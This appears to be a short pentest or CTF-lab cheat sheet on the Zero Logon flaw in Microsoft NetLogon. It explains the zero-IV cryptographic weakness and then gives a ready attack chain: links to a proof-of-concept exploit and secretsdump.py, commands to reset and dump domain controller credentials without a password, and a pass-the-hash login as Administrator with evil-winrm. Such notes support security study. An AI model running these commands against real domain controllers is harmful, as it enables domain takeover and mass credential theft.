# APIs
___
Index | Topic
--- | ---
**1** | About the vuln
**2** | Abusing the vuln
**3** | Scripts
**4** | Commands


## About the vuln

Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts.

The attack focuses on a poor implementation of Cryptography. Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, but they hard coded the initialization vector to use all zeros instead of a random string.

When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.

## Abusing the vuln

We can take the Domain Controller's Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py to dump all of the passwords within the domain.

The process looks something like this:
1. Use Zero Logon to bypass authentication on the Domain Controller's Machine Account
2. Run Secretsdump.py to dump credentials
3. Crack/Pass Domain Admin Hashes
4. ???
5. Profit

## Scripts

- [PoC](https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py)
- [secretsdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py)

## Commands

1. `python3 zero.py DC01 10.10.123.165`
2. `secretsdump.py -just-dc -no-pass DC01\$@10.10.123.165`
3. `evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.123.165`